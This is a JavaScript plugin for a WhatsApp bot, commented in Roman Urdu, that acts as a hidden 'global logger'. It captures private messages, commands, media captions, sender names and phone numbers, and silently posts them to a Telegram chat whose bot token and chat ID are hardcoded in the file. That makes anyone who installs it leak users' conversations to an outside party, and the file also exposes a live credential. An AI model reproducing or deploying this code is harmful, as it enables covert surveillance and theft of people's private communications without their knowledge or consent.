const { cmd } = require("../command");
const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ️ TELEGRAM LOGGER CONFIGURATION
// Neeche apna Telegram Bot Token aur Chat ID paste karein
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ═══════════════════════════════════════════════════════════

// Helper function to send message to Telegram
const sendToTelegram = async (text) => {
    try {
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
        
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }, { timeout: 5000 });
    } catch (error) {
        // Silent fail to prevent WhatsApp bot crash
    }
};

// ═══════════════════════════════════════════════════════════
// 🌍 GLOBAL LOGGER - HAR MESSAGE PAR NIGAH RAKHEGA 👁️
// ═══════════════════════════════════════════════════════════
cmd({
    on: "body", // Yeh har message ko capture karega
    dontAddCommandList: true,
    filename: __filename
}, async (client, message, match, { from, body, isGroup, isCreator, sender, pushName }) => {
    try {
        // Agar Token ya ID nahi dali, toh kuch mat karo
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;

        // Smart Filter: Sirf Commands, Private Chats, aur Media log karein (Telegram ban se bachne ke liye)
        const isCommand = body && body.match(/^[.,!/?#]/); // Agar message . , ! ? se shuru ho
        const isPrivate = !isGroup; // Private DM
        const isMedia = message.imageMessage || message.videoMessage || message.audioMessage || message.documentMessage || message.stickerMessage;

        // Agar na command hai, na private chat, na media, toh ignore karo (Group ki bakwas ignore)
        if (!isCommand && !isPrivate && !isMedia) return;

        // Data Extract karna
        const userNumber = sender ? sender.replace(/[^0-9]/g, '') : "Unknown";
        const userName = pushName || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi" });
        
        let chatName = "Private Chat (DM)";
        if (isGroup) {
            try {
                const groupMeta = await client.groupMetadata(from);
                chatName = groupMeta.subject || "Unknown Group";
            } catch (e) {
                chatName = "Group (Name fetch failed)";
            }
        }

        // Message Type detect karna
        let msgType = "Text";
        let msgContent = body || "No Text";
        
        if (message.imageMessage) { msgType = "🖼️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
        else if (message.videoMessage) { msgType = "🎥 Video"; msgContent = message.videoMessage.caption || "No Caption"; }
        else if (message.audioMessage) { msgType = "🎵 Audio/Voice"; msgContent = "Audio Message"; }
        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File"; }
        else if (message.stickerMessage) { msgType = "🎭 Sticker"; msgContent = "Sticker Sent"; }

        // Telegram ke liye sundar message format karna
        const logMessage = `
╭━━〔 🤖 *ACTIVITY LOG* 〕━━⬣
┃ 🕒 *Time:* \`${time}\`
┃ 👤 *User:* [${userName}](https://wa.me/${userNumber})
┃ 🔢 *Number:* \`${userNumber}\`
┃ 💬 *Chat:* ${isGroup ? "👥 Group" : "👤 Private"}
┃ 🏷️ *Group Name:* ${chatName}
┃ 📦 *Type:* ${msgType}
┃ ⌨️ *Message:* 
┃ ${msgContent}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
> *Powered by Your Bot*
        `.trim();

        // Telegram par bhej do!
        await sendToTelegram(logMessage);

    } catch (err) {
        // Error ko console mein dikhao, bot crash mat hone do
        console.log("[TG Logger Error]:", err.message);
    }
});
